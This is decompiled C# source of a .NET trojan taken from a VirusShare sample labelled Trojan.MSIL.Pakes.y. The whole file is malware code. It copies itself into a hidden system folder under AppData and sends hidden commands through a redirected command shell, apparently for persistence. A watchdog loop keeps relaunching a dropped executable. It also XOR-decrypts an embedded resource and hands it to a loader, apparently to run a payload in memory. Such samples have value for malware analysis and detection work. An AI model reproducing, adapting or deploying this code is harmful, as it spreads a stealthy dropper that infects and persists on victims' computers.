// Decompiled with JetBrains decompiler
// Type: wmpnetvk.ÖÒÓ
// Assembly: wmpnetvk, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6F41E01C-1B53-4EF5-852C-757E1AF2716B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Pakes.y-fed23795c90c49dca3a3d6d4d72e410ebc85f0dd7e9ec2d1258c1ca4623097ed.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace wmpnetvk
{
  [StandardModule]
  internal sealed class ÖÒÓ
  {
    private static readonly object ÖÓÓ = (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[0]);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr ÂÀÁ, string ËÊË, string ÀÃÀ);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr ÀÄÄ([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr ÂÀÁ, IntPtr ÒÖÖ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr ÂÀÁ, IntPtr ÒÖÖ);

    public static void ÒÕÖ()
    {
      while (true)
      {
        bool flag = false;
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          if (Operators.CompareString(processes[index].ProcessName, ÄÂÂ.ÉÉÉ[1], false) == 0)
          {
            flag = true;
            break;
          }
          Thread.Sleep(1);
          checked { ++index; }
        }
        if (!flag)
        {
          using (Process process = new Process())
          {
            process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[2];
            try
            {
              process.Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        Thread.Sleep(1);
      }
    }

    private static object ÁÁÄ(string ÃÄÅ, string ÊÈÈ)
    {
      object obj;
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = ÄÂÂ.ÉÉÉ[3],
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        };
        process.Start();
        StreamReader standardOutput = process.StandardOutput;
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine(ÄÂÂ.ÉÉÉ[4] + ÊÈÈ);
        standardInput.WriteLine(ÄÂÂ.ÉÉÉ[5] + ÃÄÅ + ÄÂÂ.ÉÉÉ[6]);
        standardInput.WriteLine(ÄÂÂ.ÉÉÉ[7]);
        standardOutput.ReadToEnd();
        standardInput.Close();
        standardOutput.Close();
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    [STAThread]
    public static void main()
    {
      try
      {
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8]))
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8]).Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory | FileAttributes.NotContentIndexed;
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8] + ÄÂÂ.ÉÉÉ[9]))
          File.Copy(Process.GetCurrentProcess().MainModule.ModuleName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8] + ÄÂÂ.ÉÉÉ[9]);
        ÖÒÓ.ÁÁÄ(ÄÂÂ.ÉÉÉ[10], Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8] + ÄÂÂ.ÉÉÉ[11]);
        File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8] + ÄÂÂ.ÉÉÉ[9], File.GetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[8] + ÄÂÂ.ÉÉÉ[9]) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ÄÂÂ.ÉÉÉ[2]))
        {
          ĐĩĺĤġ.fkoff();
          Thread.Sleep(1000);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
      IntPtr ÂÀÁ = ÖÒÓ.ÀÄÄ(ref moduleName);
      IntPtr resource = ÖÒÓ.FindResource(ÂÀÁ, ÄÂÂ.ÉÉÉ[12], ÄÂÂ.ÉÉÉ[13]);
      IntPtr source = ÖÒÓ.LoadResource(ÂÀÁ, resource);
      int length = ÖÒÓ.SizeofResource(ÂÀÁ, resource);
      byte[] numArray = new byte[checked (length - 1 + 1 - 1 + 1)];
      Marshal.Copy(source, numArray, 0, length);
      Random random = new Random(BitConverter.ToInt32(numArray, Convert.ToInt32(checked (numArray.Length - 4))));
      byte[] ǅɫǅ = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (numArray.Length - 3 + 1 - 1 + 1)]);
      byte[] buffer = new byte[checked (ǅɫǅ.Length - 1 + 1 - 1 + 1)];
      int int32 = Convert.ToInt32(checked (ǅɫǅ.Length - 1));
      random.NextBytes(buffer);
      int index = 0;
      while (index <= int32)
      {
        ǅɫǅ[index] = Convert.ToByte((byte) ((int) ǅɫǅ[index] ^ (int) buffer[index]));
        checked { ++index; }
      }
      ĐĩĺĤġ.ĳĵģīĩĴ(ǅɫǅ, Process.GetCurrentProcess().MainModule.ModuleName);
      ÖÒÓ.ÒÕÖ();
      NewLateBinding.LateCall(ÖÒÓ.ÖÓÓ, (Type) null, "clear", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
    }
  }
}
